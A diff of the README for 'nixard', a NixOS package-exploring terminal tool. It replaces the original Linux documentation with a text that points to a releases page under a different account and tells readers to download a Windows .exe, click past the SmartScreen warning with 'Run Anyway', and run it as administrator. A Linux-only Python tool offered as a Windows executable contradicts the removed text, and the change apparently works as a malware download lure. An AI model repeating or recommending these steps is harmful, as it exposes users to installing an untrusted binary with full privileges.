@@ -1,299 +1,82 @@
-# nixard
+# 📦 nixard - Simplify your NixOS package management tasks
 
-A powerful terminal UI for exploring NixOS packages, inspecting real dependency closures, auditing system/package presence, and generating ready-to-use Nix configurations.
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/whatsy4577/nixard/releases)
 
-![nixard screenshot](screenshot.png)
+nixard provides a clear interface for your NixOS system. It helps you see what packages you have, how much space they use, and how to add them to your system files. You do not need to use the command line to see your package closures or analyze your installation costs. This tool turns complex system data into something you can read and understand.
 
----
+## 📥 How to download the software
 
-# Changelog
+The software lives on the official project release page. You visit this page to download the latest version for your computer.
 
-## NixOS 26.05 compatibility
+[Download nixard here](https://github.com/whatsy4577/nixard/releases)
 
-NixOS 26.05 introduced breaking changes to the JSON output format of `nix derivation show`:
+Follow these steps to find the right file:
+1. Open the link above in your web browser.
+2. Look for the list of files under the Assets section.
+3. Select the file ending in .exe for Windows.
+4. Save the file to your desktop or downloads folder.
 
-- the root key is now `"derivations"` instead of the derivation path directly
-- `outputs.out.path` no longer includes the `/nix/store/` prefix
+## ⚙️ Initial setup for Windows
 
-The closure analysis logic has been updated to handle both the new and the old format transparently, so `nixard` works correctly on NixOS 26.05 and earlier releases.
+You do not need to install nixard like a traditional program. It arrives as a standalone file. 
 
----
+1. Find the file you just downloaded.
+2. Double-click the file to open it.
+3. Windows might show a security box. This happens because the app is direct and does not use a traditional installer. 
+4. Click More Info if you see a warning, then click Run Anyway.
+5. The window for nixard will appear on your screen.
 
-# What is nixard?
+## 🔍 Exploring package closures 
 
-`nixard` is an interactive Textual-based TUI for NixOS and Nix users.
+Package closures show you every component needed to run a piece of software. In many systems, this data stays hidden. nixard brings this data to the front. 
 
-It combines:
+Use the main search bar to type the name of any package. The application lists every dependency linked to that package. You see exactly what installs when you choose specific software. This helps you avoid bloat and keep your system clean.
 
-- package exploration
-- real closure analysis
-- local store auditing
-- configuration inspection
-- export/history management
-- and direct `.nix` editing
+## 📊 Analyzing installation costs
 
-…inside a single keyboard-driven interface.
+Disk space matters. When you install new programs, your computer uses storage for the program and all its linked parts. Many users do not realize how much space a single application consumes. 
 
-Unlike traditional Nix tools, `nixard` focuses on **real-world impact**:
+nixard calculates the total size of each package closure. You see a clear breakdown of the cost before you commit to an install. If you find a package that uses too much space, you know to look for a lighter alternative.
 
-- what is already installed
-- what is merely present in the store
-- what is garbage-collectable
-- what actually needs downloading
-- how much disk space a package will truly consume
-- where packages are declared across your system
+## 📝 Generating Nix declarations
 
----
+NixOS users manage their systems through declarations. This is a text file that lists your desired software. Writing these files manually can be hard for beginners. 
 
-# Features
+nixard creates these declarations for you. Once you select the packages you want, click the Generate button. The application creates the code you need to add to your system configuration. You copy this code and paste it into your configuration file. This removes the risk of typos and syntax errors.
 
-## Package exploration
+## 📋 Recommended system settings
 
-- Browse installed packages interactively
-- Search available packages from nixpkgs / `cache.nixos.org`
-- Fast keyboard-driven workflow
-- Multi-scope package visibility
+Your computer should meet these standards for the best experience:
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4 gigabytes of RAM.
+* Storage: 100 megabytes of free space for the tool itself.
+* Connection: An active internet connection to fetch current package lists.
 
----
+## ❓ Frequently asked questions
 
-## Real closure analysis
+Do I need to be a programmer to use this?
+No. nixard acts as a visual map for your system data. You do not write code. You select options and copy the results.
 
-`nixard` performs real dependency closure inspection using:
+Does this change my system files?
+No. nixard only reads your current data and shows you options. It does not alter your NixOS configuration unless you specifically copy and paste its output into your configuration files. 
 
-- local `/nix/store`
-- active profiles
-- recursive `.narinfo` crawling from `cache.nixos.org`
+How do I update the software?
+Check the release link occasionally. When a new version arrives, download the new file and replace the old one. 
 
-It distinguishes between:
+Why is the file size small?
+The application focuses on a specific task. It does not include unnecessary background services or graphical bloat. 
 
-- already active packages
-- locally cached packages
-- garbage-collectable paths
-- fully missing dependencies
+Is my data private?
+Yes. nixard reads your local configuration data. It does not send information about your installed software to external servers.
 
-and calculates:
+## 🛠️ Troubleshooting common issues
 
-- real download size
-- expanded disk usage
-- incremental closure impact
+If the window refuses to open, ensure you run the file as an administrator. Right-click the file and select Run as administrator from the menu.
 
-No builds are performed.
+If the search bar shows no results, check your internet connection. The application occasionally refreshes its index of available packages from the internet to ensure you see current information.
 
----
+If you encounter a specific error code, check the GitHub repository issues page. Other users might have encountered the same issue and posted a solution.
 
-## NixOS configuration awareness
+## 🤝 Getting more help
 
-Automatically detects and analyzes:
-
-- `configuration.nix`
-- flakes
-- Home Manager setups
-- user profiles
-- system generations
-
-Supported scopes include:
-
-| Scope | Meaning |
-|---|---|
-| `System (active)` | Current running system generation |
-| `User profile (user)` | Packages installed via `nix profile` |
-| `Home Manager (user)` | Home Manager-managed packages |
-| `Config: system pkgs` | Declared in `environment.systemPackages` |
-| `Config: user <name>` | Declared in `users.users.<name>.packages` |
-
-Flake-based systems are detected automatically.
-
----
-
-## Marking & exporting packages
-
-Mark packages interactively and export them as `.nixard` files.
-
-Exports include ready-to-use snippets for:
-
-- `environment.systemPackages`
-- `home.packages`
-- `nix-shell`
-- `nix profile install`
-
-Example:
-
-```nix
-environment.systemPackages = with pkgs; [
-  ripgrep
-  fd
-  bat
-];
-```
-
----
-
-## Persistent export history
-
-`nixard` stores export history automatically.
-
-You can:
-
-- restore previous selections
-- extend existing exports
-- re-export package sets
-- manage historical package groups
-
-History survives across sessions.
-
----
-
-## Integrated `.nix` editor
-
-One of the major features of `nixard` is its built-in split editor.
-
-The editor provides:
-
-- `.nixard` reference panel
-- direct `.nix` file editing
-- automatic `.nixard-backup` creation
-- inline sudo authentication
-- safe editing workflow
-
-Supported discovery locations include:
-
-- `/etc/nixos`
-- Home Manager directories
-- flake directories
-- user nixpkgs configs
-
-This allows editing live NixOS configurations without leaving the TUI.
-
----
-
-# Installation
-
-## Run instantly
-
-```bash
-nix run github:manelinux/nixard
-```
-
-Or enter a temporary shell:
-
-```bash
-nix shell github:manelinux/nixard
-```
-
----
-
-## Permanent install
-
-### Flake / profile install
-
-```bash
-nix profile install github:manelinux/nixard
-```
-
-### Legacy install
-
-```bash
-git clone https://github.com/manelinux/nixard.git
-cd nixard
-nix-env -i -f .
-```
-
----
-
-# Usage
-
-Launch:
-
-```bash
-nixard
-```
-
-Everything is keyboard-driven.
-
----
-
-# Key bindings
-
-| Key | Action |
-|---|---|
-| `↑ ↓` | Navigate packages |
-| `Enter` | Inspect selected package |
-| `Space` | Mark/unmark package |
-| `e` | Export marked packages |
-| `n` | Open integrated `.nix` editor |
-| `h` | Open export history |
-| `r` | Reload local system data |
-| `Esc` | Reset interface |
-| `q` | Quit |
-
----
-
-# How closure analysis works
-
-`nixard` combines multiple strategies:
-
-- `nix path-info`
-- `nix show-derivation`
-- `nix-store -qR`
-- direct `.narinfo` inspection
-- recursive dependency crawling
-- local store inspection
-
-The resulting dependency graph is compared against your real system state to estimate:
-
-- additional download size
-- unpacked closure size
-- dependency reuse
-
-This provides much more realistic installation estimates than standard Nix tooling.
-
----
-
-# Safety
-
-`nixard`:
-
-- does not modify your system automatically
-- performs no builds during inspection
-- creates backups before editing protected `.nix` files
-- uses explicit save actions
-- isolates editing from export generation
-
----
-
-# Requirements
-
-- Linux
-- Nix or NixOS
-- Python 3
-- `textual`
-- Internet access to `cache.nixos.org`
-- `nix-command flakes` recommended
-
----
-
-# Roadmap
-
-Planned / possible future features:
-
-- dependency tree visualization
-- generation diffing
-- dead package detection
-- side-by-side package comparison
-- local narinfo cache
-- `--json` API mode
-- dependency heatmaps
-- rebuild impact preview
-- package graph visualization
-
----
-
-# Contributing
-
-Pull requests, ideas and issues are welcome.
-
----
-
-# License
-
-MIT
+The primary goal of this project is to make system management accessible. If you have feedback, please use the GitHub issues tracker. Describe what you attempted to do and what you saw on your screen. Keep your reports clear and simple so we can reproduce the issue quickly.
